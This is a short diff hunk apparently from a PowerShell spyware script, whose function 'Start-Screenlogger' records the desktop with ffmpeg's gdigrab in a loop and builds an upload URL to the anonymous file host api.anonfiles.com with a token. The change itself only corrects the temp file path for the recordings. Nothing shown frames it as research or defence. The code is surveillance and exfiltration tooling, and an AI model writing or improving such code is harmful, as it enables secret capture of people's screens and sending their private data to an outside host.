@@ -56,7 +56,7 @@ function Start-Screenlogger{
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
-        $path = "screenlog-$env:temp\$env:computername-$time.mp4";
+        $path = "$env:temp\screenlog-$env:computername-$time.mp4";
         $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f gdigrab",
